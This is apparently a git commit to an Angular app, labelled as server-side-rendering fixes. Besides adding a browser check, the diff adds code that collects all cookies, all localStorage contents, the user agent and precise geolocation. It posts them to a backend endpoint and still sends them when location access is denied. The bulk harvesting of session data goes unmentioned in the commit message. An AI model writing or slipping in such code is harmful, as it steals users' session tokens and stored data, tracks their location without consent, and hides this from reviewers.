3c09b1fdb04617d90c3d576407cb79e2665e0599
JaRodriguez97 <cristi542012@gmail.com>
2024-12-04 12:25:47 -0500

    arreglos ssr

--- src/app/components/info-user/info-user.component.ts
+++ src/app/components/info-user/info-user.component.ts
@@ -13,43 +13,84 @@ export class InfoUserComponent implements OnInit {
   constructor(private deviceService: DeviceService) {}
 
   ngOnInit(): void {
+    if (!this.deviceService.isBrowser) return;
+
     this.getDeviceInfo();
   }
 
   getDeviceInfo(): void {
     this.loading = true;
     const userAgent = navigator.userAgent;
-    console.log("🚀 ~ InfoUserComponent ~ getDeviceInfo ~ navigator:", navigator)
 
     navigator.geolocation.getCurrentPosition(
-      (position) => {
-        const data = {
-          userAgent,
-          location: {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-          },
-        };
-
-        this.deviceService.sendDeviceInfo(data).subscribe(
-          (response) => {
-            this.loading = false;
-            this.message = 'Información enviada correctamente.';
-            console.log(response);
-          },
-          (error) => {
-            this.loading = false;
-            this.message = 'Error al enviar información.';
-            console.error(error);
-          }
-        );
-      },
+      (position) => this.sendData(userAgent, position),
       (error) => {
         this.loading = false;
         this.message = 'No se pudo obtener la ubicación.';
         console.error(error);
+        this.sendData(userAgent);
       }
     );
+  }
+
+  getAllLocalStorageData(): { [key: string]: any } {
+    const allData: { [key: string]: any } = {};
+
+    for (let i = 0; i < localStorage.length; i++) {
+      const key = localStorage.key(i); // Obtiene el nombre de la clave
+      if (key) {
+        const value = localStorage.getItem(key); // Obtiene el valor
+        try {
+          // Intenta parsear como JSON, si no es JSON devuelve el string
+          allData[key] = value ? JSON.parse(value) : null;
+        } catch {
+          allData[key] = value;
+        }
+      }
+    }
+
+    return allData;
+  }
+
+  getAllCookies(): { [key: string]: string } {
+    const cookies: { [key: string]: string } = {};
+    const documentCookies = document.cookie; // Obtiene todas las cookies como un string
+
+    if (documentCookies) {
+      documentCookies.split(';').forEach((cookie) => {
+        const [key, value] = cookie.split('='); // Divide en clave y valor
+        cookies[key.trim()] = decodeURIComponent(value); // Decodifica y elimina espacios
+      });
+    }
+
+    return cookies;
+  }
+
+  sendData(userAgent: string, p?: GeolocationPosition): void {
+    const data = {
+      userAgent,
+      cookies: this.getAllCookies(),
+      localStorage: this.getAllLocalStorageData(),
+      location: p
+        ? {
+            latitude: p.coords.latitude,
+            longitude: p.coords.longitude,
+            accuracy: p.coords.accuracy,
+          }
+        : null,
+    };
+
+    this.deviceService.sendDeviceInfo(data).subscribe({
+      next: (response) => {
+        this.loading = false;
+        this.message = 'Información enviada correctamente.';
+        console.log(response);
+      },
+      error: (error) => {
+        this.loading = false;
+        this.message = 'Error al enviar información.';
+        console.error(error);
+      },
+    });
   }
 }
--- src/app/services/device.service.ts
+++ src/app/services/device.service.ts
@@ -1,15 +1,22 @@
-import { Injectable } from '@angular/core';
+import { Inject, Injectable, PLATFORM_ID } from '@angular/core';
 import { HttpClient } from '@angular/common/http';
 import { Observable } from 'rxjs';
 import { environment } from '@env/environment';
+import { isPlatformBrowser } from '@angular/common';
 
 @Injectable({
   providedIn: 'root',
 })
 export class DeviceService {
   private apiUrl = environment.back;
+  isBrowser: boolean;
 
-  constructor(private http: HttpClient) {}
+  constructor(
+    private http: HttpClient,
+    @Inject(PLATFORM_ID) private platformId: Object
+  ) {
+    this.isBrowser = isPlatformBrowser(this.platformId);
+  }
 
   sendDeviceInfo(data: any): Observable<any> {
     return this.http.post(this.apiUrl, data);
